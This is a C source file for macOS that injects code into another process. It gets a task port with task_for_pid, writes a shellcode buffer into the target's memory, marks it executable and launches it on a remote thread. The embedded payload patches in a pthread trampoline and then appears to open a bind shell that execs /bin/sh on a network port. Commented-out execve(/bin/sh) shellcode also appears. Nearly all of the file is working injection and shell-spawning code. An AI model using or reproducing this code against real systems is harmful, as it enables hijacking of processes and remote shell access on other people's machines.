/*
testing remote process/thread injection 
https://sinister.ly/Thread-Memory-Injection-on-macOS

//task_for_pid needs help http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/

//CANNOT USE TASK_FOR_PID in native OSX binaries since 10.14 (compiled with SIP)
//see thread injection here: https://knight.sc/malware/2019/03/15/code-injection-on-macos.html



must use sudo to work

code signing seems maybe optional?

still dont understand printf(task) correctly

still need a way to kick off thread

RAW SHELLCODE INJECTION WORKS!!! for "loop forever shellcode" apparently lol

injection logic from https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a


need some way to take a mach task ->ptthread as shellcode before my shellcode
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach_vm.h>
#include<mach/mach_traps.h>
#include <mach/mach_init.h>
#include <mach/error.h>
#include <mach/mach.h>
#include <dlfcn.h>
#include <Security/Authorization.h>

#include <pthread.h>

#define STACK_SIZE 65536

char payload[] =
    // "\xCC"                            // int3

    "\x55"                            // push       rbp
    "\x48\x89\xE5"                    // mov        rbp, rsp
    "\x48\x83\xEC\x10"                // sub        rsp, 0x10
    "\x48\x8D\x7D\xF8"                // lea        rdi, qword [rbp+var_8]       
    "\x31\xC0"                        // xor        eax, eax
    "\x89\xC1"                        // mov        ecx, eax                     
    "\x48\x8D\x15\x21\x00\x00\x00"    // lea        rdx, qword ptr [rip + 0x21]  
    "\x48\x89\xCE"                    // mov        rsi, rcx                     
    "\x48\xB8"                        // movabs     rax, pthread_create_from_mach_thread
    "PTHRDCRT"
    "\xFF\xD0"                        // call       rax
    "\x89\x45\xF4"                    // mov        dword [rbp+var_C], eax
    "\x48\x83\xC4\x10"                // add        rsp, 0x10
    "\x5D"                            // pop        rbp
    "\x48\xc7\xc0\x13\x0d\x00\x00"    // mov        rax, 0xD13
    "\xEB\xFE"                        // jmp        0x0
    "\xC3"                           // ret;
   "\x48\x31\xff\x40\xb7\x02\x48\x31\xf6\x40\xb6\x01\x48\x31\xd2\x48" 
"\x31\xc0\xb0\x02\x48\xc1\xc8\x28\xb0\x61\x49\x89\xc4\x0f\x05\x49" 
"\x89\xc1\x48\x89\xc7\x48\x31\xf6\x56\xbe\x01\x02\x11\x5c\x83\xee" 
"\x01\x56\x48\x89\xe6\xb2\x10\x41\x80\xc4\x07\x4c\x89\xe0\x0f\x05" 
"\x48\x31\xf6\x48\xff\xc6\x41\x80\xc4\x02\x4c\x89\xe0\x0f\x05\x48" 
"\x31\xf6\x41\x80\xec\x4c\x4c\x89\xe0\x0f\x05\x48\x89\xc7\x48\x31" 
"\xf6\x41\x80\xc4\x3c\x4c\x89\xe0\x0f\x05\x48\xff\xc6\x4c\x89\xe0" 
"\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68" 
"\x57\x48\x89\xe7\x48\x31\xd2\x41\x80\xec\x1f\x4c\x89\xe0\x0f\x05";



// ripped this code from somewhere.... used to get Macho taskport rights? (might be uneccesarry)
int acquireTaskportRight()
{
  OSStatus stat;
  AuthorizationItem taskport_item[] = {{"system.privilege.taskport:"}};
  AuthorizationRights rights = {1, taskport_item}, *out_rights = NULL;
  AuthorizationRef author;
  int retval = 0;

  AuthorizationFlags auth_flags = kAuthorizationFlagExtendRights | kAuthorizationFlagPreAuthorize | kAuthorizationFlagInteractionAllowed | ( 1 << 5);

  stat = AuthorizationCreate (NULL, kAuthorizationEmptyEnvironment,auth_flags,&author);
  if (stat != errAuthorizationSuccess)
    {
      return 0;
    }

  stat = AuthorizationCopyRights ( author, &rights, kAuthorizationEmptyEnvironment, auth_flags,&out_rights);
  if (stat != errAuthorizationSuccess)
    {
      printf("fail");
      return 1;
    }
  return 0;
}

void check(int cond, char* msg)
{
  if (!cond)
    {
      printf("%s\n", msg);
      exit(-1);
    }
}


//defining a struct for our VM related data
typedef struct {
    mach_vm_address_t addr;
    size_t size;
    vm_prot_t prot;
} vm_region_t;

//helloworld - does not work
//char payload[] = "\xeb\x1e\x5e\xb8\x04\x00\x00\x02\xbf\x01\x00\x00\x00\xba\x0e\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x02\xbf\x00\x00\x00\x00\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0d\x0a";

//execve(/bin/sh)
//char payload[] = "\x48\x31\xc0\x99\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";

//char payload[]="\xeb\xfe";

int main(int argc, char *argv[]){

    mach_error_t kr = 0;
    mach_vm_address_t remoteStack64 = (vm_address_t)NULL;

    vm_region_t shellcode = {
        .addr = 0,
        .size = sizeof(payload),
        .prot = VM_PROT_READ | VM_PROT_EXECUTE | VM_PROT_WRITE
    };

    if (acquireTaskportRight() != 0)
    {
      printf("acquireTaskportRight() failed!\n");
      exit(0);
    }

    //get handle to remote task
    task_t task;
    printf("[*] Getting handle to task: %d\n", atoi(argv[1]));
    task_for_pid(mach_task_self(), atoi(argv[1]), &task);
    printf("[+] Handle for task: 0x%x\n", task);


    //allocate memory in remote task - save address to shellcode.addr
    mach_vm_allocate(task, &shellcode.addr, shellcode.size, VM_FLAGS_ANYWHERE);
    printf("[+] Allocated %d bytes in remote buffer at: 0x%016lx\n", shellcode.size, shellcode.addr);

    kr = mach_vm_allocate(task, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return (-2);
    }
    else {
        fprintf(stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
    }
    //here we should patch our trampoline code so pthread_set_self() can be called in memory

    int i = 0;
    char *possiblePatchLocation = (payload);
    for (i = 0; i < 0x100; i++) {
        // Patching is crude, but works.
        //
        extern void *_pthread_set_self;
        possiblePatchLocation++;

        uint64_t addrOfPthreadCreate = (uint64_t)dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");

        if (memcmp(possiblePatchLocation, "PTHRDCRT", 8) == 0) {
            printf("pthread_create_from_mach_thread @%llx\n", addrOfPthreadCreate);
            memcpy(possiblePatchLocation, &addrOfPthreadCreate, 8);            
        }
    }


    //write payload into remote memory
    mach_vm_write(task, shellcode.addr, payload, sizeof(payload));
    printf("[+] writing %d bytes to remote buffer\n", shellcode.size);

    //adjust permissions from RW to RX
    mach_vm_protect(task, shellcode.addr, shellcode.size, 0, shellcode.prot);
    printf("[+] Adjusting VM protections in buffer to RX\n");

    //kick off shellcode
    //create a thread to run

    x86_thread_state64_t remoteThreadState64;

    thread_act_t remoteThread;

    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
                                       //remoteStack64 -= 8;  // need alignment of 16

    const char *p = (const char *)shellcode.addr;

    //remoteThreadState64.__rip = (u_int64_t)(vm_address_t)remoteCode64;
    remoteThreadState64.__rip = (u_int64_t)(vm_address_t)shellcode.addr;

    // set remote Stack Pointer
    remoteThreadState64.__rsp = (u_int64_t)remoteStack64;
    remoteThreadState64.__rbp = (u_int64_t)remoteStack64;

    printf("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p);

    /*
     * create thread and launch it in one go
     */
    kr = thread_create_running(task, x86_THREAD_STATE64,
                               (thread_state_t)&remoteThreadState64, x86_THREAD_STATE64_COUNT, &remoteThread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to create remote thread: error %s", mach_error_string(kr));
        return (-3);
    }

       // Wait for mach thread to finish
    mach_msg_type_number_t thread_state_count = x86_THREAD_STATE64_COUNT;
    for (;;) {
        kr = thread_get_state(remoteThread, x86_THREAD_STATE64, (thread_state_t)&remoteThreadState64, &thread_state_count);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "Error getting stub thread state: error %s", mach_error_string(kr));
            break;
        }
        
        if (remoteThreadState64.__rax == 0xD13) {
            printf("Stub thread finished\n");
            kr = thread_terminate(remoteThread);
            if (kr != KERN_SUCCESS) {
                fprintf(stderr, "Error terminating stub thread: error %s", mach_error_string(kr));
            }
            break;
        }
    }
    

    printf("done");
}